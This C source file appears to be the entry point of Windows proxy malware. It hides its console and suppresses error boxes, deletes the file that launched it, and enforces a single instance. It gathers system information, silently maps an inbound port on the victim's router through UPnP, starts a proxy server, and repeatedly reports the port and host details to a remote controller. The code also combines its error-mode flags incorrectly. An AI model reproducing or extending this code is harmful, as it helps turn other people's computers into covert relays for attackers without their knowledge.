#pragma optimize("gsy",on)
#ifndef _DEBUG
#   pragma comment(linker, "/SUBSYSTEM:windows")
#else // _DEBUG
#   pragma comment(linker, "/SUBSYSTEM:console")
#endif // _DEBUG

#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <shellapi.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "config.h"
#include "info.h"
#include "report.h"
#include "upnp.h"
#include "proxy.h"

int str_match( cchar* Pattern, cchar* String )
{
    switch( *Pattern )
    {
    case '\0': return *String;
    case '*' : return !(!str_match(Pattern + 1, String) || *String && !str_match(Pattern, String + 1));
    case '?' : return !(*String && !str_match(Pattern + 1, String + 1));
    default  : return !((toupper(*Pattern) == toupper(*String)) && !str_match(Pattern + 1, String + 1));
    }
}

/**
 * @name                      main
 * @param             argc    Parameter count
 * @param             argv    Parameter array
 * @note                      Entrypoint
 **/
void main( int argc, char** argv )
{
    WSADATA       WsaData;
    upnp_device_t Device;
    info_t        Info;
    ushort        Port     = 0;
    PHOSTENT      Addr    = NULL;
    BOOL          Private = FALSE,
                  UpNP    = FALSE,
                  Report  = FALSE;
    HANDLE        Mutex   = NULL;
    char          Host[MAX_PATH];

    memset( &Info, 0, sizeof(Info) );
    memset( &Host, 0, sizeof(Host) );

    SetErrorMode( SEM_FAILCRITICALERRORS     &&
                  SEM_NOALIGNMENTFAULTEXCEPT &&
                  SEM_NOGPFAULTERRORBOX      &&
                  SEM_NOOPENFILEERRORBOX );

	info_all( &Info );

    if( argc >= 2 )
        DeleteFile( argv[1] );

    Mutex = CreateMutex( NULL, FALSE, conf_mutex );

    if( GetLastError() == ERROR_ALREADY_EXISTS )
        ExitProcess( 0 );

    if( WSAStartup(MAKEWORD(2, 2), &WsaData) )
        if( WSAStartup(MAKEWORD(1, 1),&WsaData) )
            ExitProcess( EXIT_FAILURE );

    srand( GetTickCount() );
    Port = 43442;//(GetTickCount() % (MAXWORD - 6050)) + 6000; //Select a random port, from 6000 to 65535
	
    if( gethostname(Host, sizeof(Host)) == 0 )
    {
        Addr = gethostbyname( Host );
        if( Addr != NULL )
        {
            memset( &Host, 0, sizeof(Host) );
            strcpy( Host, inet_ntoa(*(struct in_addr *)Addr->h_addr_list[0]) );
        }
    }
    if( (str_match("10.*",      Host) == 0) ||
        (str_match("172.1?.*",  Host) == 0) ||
        (str_match("172.2?.*",  Host) == 0) ||
        (str_match("172.3?.*",  Host) == 0) ||
        (str_match("192.168.*", Host) == 0) )
        Private = TRUE;

    memset( &Device, 0, sizeof(Device) );

    if( upnp_discover(&Device, Host) )
    {
        if( upnp_read_desc(&Device) )
        {
            if( upnp_add_port(&Device, "TCP", Host, Port, Port, conf_name) ) {
                UpNP = TRUE;
            } else {
                //debug_printf( "UPnP", "Failed to map port. (%d)", Port );
            }
        } else {
            //debug_printf( "UPnP", "Failed to get device description." );
        }
    } else {
        //debug_printf( "UPnP", "No devices found." );
    }

    _beginthread( &proxy_thread_server, 0, &Port );

    for( ;; )
	{
        if( Report == FALSE )
		{
            Report = Rprt(Port,int(Private), int(UpNP), &Info);
			if( Report == FALSE )
			{
				Sleep(10 * 60000);
			}
		}
		else
		{
			Sleep(conf_sleep_time * 60000);
		}
    }
	
    WSACleanup();
    ReleaseMutex(Mutex);
}